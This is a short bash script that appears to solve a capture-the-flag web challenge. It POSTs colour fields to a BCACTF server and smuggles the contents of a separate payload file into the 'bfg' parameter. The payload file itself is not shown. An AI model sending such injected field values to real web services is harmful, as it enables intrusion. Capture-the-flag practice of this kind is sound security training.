#! /usr/bin/env bash

curl --data-urlencode "bg=white" --data-urlencode "fg=black" --data-urlencode "bbg=black" --data-urlencode "bfg=$(cat payload2.txt)" -X POST http://webp.bcactf.com:49153/submit